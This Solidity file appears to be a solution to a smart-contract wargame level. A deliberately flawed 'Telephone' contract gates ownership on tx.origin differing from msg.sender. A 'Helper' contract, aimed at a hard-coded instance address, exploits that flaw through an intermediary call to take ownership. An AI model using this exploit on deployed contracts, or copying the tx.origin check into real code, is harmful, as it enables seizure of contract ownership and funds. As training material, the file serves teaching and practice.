// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract Helper {

    Telephone public instance;

    constructor() public {
        instance = Telephone(0x897c914b5E21a9692e0D837DcB210261e9707fDb);
    }

    function hackTelephone() public {
        instance.changeOwner(msg.sender);
    }
}
